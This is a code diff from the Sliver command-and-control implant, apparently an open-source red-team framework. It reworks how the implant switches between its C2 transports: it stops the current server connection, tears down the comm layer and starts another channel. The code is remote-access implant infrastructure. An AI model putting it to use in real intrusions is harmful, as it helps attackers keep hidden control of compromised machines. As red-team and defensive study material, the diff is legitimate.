@@ -24,10 +24,13 @@ import (
 	// {{end}}
 
 	"errors"
+	"fmt"
 	"net/url"
 	"strconv"
 	"sync"
 	"time"
+
+	"github.com/bishopfox/sliver/sliver/comm"
 )
 
 const (
@@ -58,7 +61,6 @@ var (
 	// Transports - All active transports on this implant.
 	Transports = &transports{
 		Available: map[uint32]*Transport{},
-		CommID:    make(chan uint64),
 		mutex:     &sync.Mutex{},
 	}
 )
@@ -68,12 +70,7 @@ var (
 type transports struct {
 	Available map[uint32]*Transport // All transports available (compiled in) to this implant
 	Server    *Transport            // The transport tied to the C2 server (active connection)
-
-	// CommID - A blocking channel over which a transport receives a tunnel ID.
-	// This ID is sent by the server/pivots after implant has registered its C2 Session,
-	// and is the ID of the tunnel we'll use to setup Comms.
-	CommID chan uint64
-	mutex  *sync.Mutex
+	mutex     *sync.Mutex
 }
 
 // Init - Parses all available transport strings and registers them as available transports.
@@ -86,7 +83,7 @@ func (t *transports) Init() (err error) {
 		if err != nil {
 			continue
 		}
-		transport, _ := newTransport(uri)
+		transport, _ := NewTransport(uri)
 		t.Add(transport)
 	}
 	if len(t.Available) == 0 {
@@ -103,7 +100,7 @@ func (t *transports) Init() (err error) {
 		// This might will init the Comm system, but in the case of tunnel-based
 		// routing, we have concurrently started this process, and it will only
 		// finish its setup once we are out of this Init() function.
-		err = tp.Start(false)
+		err = tp.start()
 
 		if err != nil {
 			// Wait if this transport failed.
@@ -143,26 +140,45 @@ func (t *transports) Get(ID uint32) (tp *Transport) {
 }
 
 // Switch - Dynamically switch the active transport, if multiple are available.
-func (t *transports) Switch(ID uint32, force bool) (err error) {
+func (t *transports) Switch(ID uint32) (err error) {
 
-	// Everything in the transport is set up and running, including RPC layer.
-	// We now either send a registration envelope, or anything.
-	// activeConnection = t.C2
-	// activeC2 = t.URL.String()
+	next, found := t.Available[ID]
+	if !found {
+		return fmt.Errorf("No transport available for ID %d", ID)
+	}
 
-	// t.Server = t // The transport tied to the server
-	return
+	// Close the Comm system, and all comm listeners
+	err = comm.PrepareCommSwitch()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("Comm Switch error: " + err.Error())
+		// {{end}}
+	}
+
+	// Cut the current transport
+	err = t.Server.Stop()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+	}
+
+	// Start the new one and assign to active server connection.
+	err = next.start()
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf(err.Error())
+		// {{end}}
+		return
+	}
+	t.Server = next
+
+	// Send a confirmation message, because the server is waiting for it.
+	// (by nature the call to switch transports must be asynchronous,
+	// without any error return in the same RPC handler)
+
+	return nil
 }
-
-// Sould not be needed anymore, or translated for transports.
-// func nextCCServer() *url.URL {
-//         uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
-//         *ccCounter++
-//         if err != nil {
-//                 return nextCCServer()
-//         }
-//         return uri
-// }
 
 // GetActiveC2 returns the URL of the C2 in use
 func GetActiveC2() string {
